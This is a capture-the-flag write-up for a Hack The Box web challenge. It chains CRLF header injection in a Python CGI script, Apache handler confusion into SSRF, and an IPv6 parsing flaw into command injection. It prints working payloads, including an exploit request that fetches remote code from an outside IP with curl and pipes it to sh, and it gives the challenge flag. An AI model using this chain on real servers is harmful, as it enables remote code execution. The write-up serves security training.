# Cyber Attack
Tags: #apache #cgi #crlf #parser #command-injection 
## TLDR
Reponse header injection -> SSRF -> ACL bypass -> IP parser bypass & Command Injection -> RCE
## Description
> Welcome, Brave Hero of Eldoria. You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria. This is no place for the faint of heart. Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels. But if you’re brave—or foolish—enough to exploit these defenses, you might just find a way to weaken his hold on this world. Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all. The shadows are watching. Make your move.
## Overview
Simple website that calls a cgi script that makes a ping to a specified domain.
## Road to flag
The flag is in a file with a random name `mv /flag.txt /flag-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 15).txt` -> RCE
## Code review
There are 2 cgi python scripts:
- `attack-domain`
Has an response header injection vulnerability due to `print(f'Location: ../?error=Hey {name}, watch it!')`.
The regex that checks the domain name seems robust so there's no command injection.
```python
#!/usr/bin/env python3

import cgi
import os
import re

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

- `attack-ip`
This script is similar to the previous one, but parses the ip with `ip_address`. Can this allow command injection?
```python
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

It's accessible only from localhost:
`apache2.conf`
```conf
ServerName CyberAttack 

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip"> 
    Order deny,allow
    Deny from all
    Allow from 127.0.0.1
    Allow from ::1
</Location>
```

## Exploitation

- Response header injection (CRLF) to Authorization bypass

In Apache, handlers are taken from the `content-type` header (or at least in older versions). Here there's a detailed explanation -> https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
```c
AP_CORE_DECLARE(int) ap_invoke_handler(request_rec *r) {

    // [...]

    if (!r->handler) {
        if (r->content_type) {
            handler = r->content_type;
            if ((p=ap_strchr_c(handler, ';')) != NULL) {
                char *new_handler = (char *)apr_pmemdup(r->pool, handler,
                                                        p - handler + 1);
                char *p2 = new_handler + (p - handler);
                handler = new_handler;

                /* exclude media type arguments */
                while (p2 > handler && p2[-1] == ' ')
                    --p2; /* strip trailing spaces */

                *p2='\0';
            }
        }
        else {
            handler = AP_DEFAULT_HANDLER_NAME;
        }

        r->handler = handler;
    }

    result = ap_run_handler(r);
```

So with the header injection it's possible to inject `Content-Type` and call an arbitrary handler.
The `proxy` handler is interesting because allows to turn this vulnerability into an **SSRF**.

With the SSRF I can bypass the localhost restrictions and get access to `/cgi-bin/attack-ip`.

Payload:
`\r\nLocation:/ooo\r\n\r\nContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip\r\n\r\n`

- IP parsing flaw to RCE
After some testing, we found that the `ipaddress` python's library is vulnerable, has a flaw in parsing IPV6:

```python
import ipaddress
ip = ipaddress.ip_address("1::%${curl IP | sh}")
# 1::%${curl IP |sh}
```

This flaw enables RCE in the `attack-ip` script.

- Exploit request: `GET /cgi-bin/attack-domain?target=aa&name=%0d%0aLocation%3a%20%2fa%0d%0aContent-Type%3a%20proxy%3ahttp%3a%2f%2f127.0.0.1%2fcgi-bin%2fattack-ip%3ftarget%3d%3a%3a1%25%24(curl%2b37.27.184.43%7csh)%26name%3dx%0d%0a%0d%0a`


Flag: `HTB{h4ndl1n6_m4l4k4r5_f0rc35}`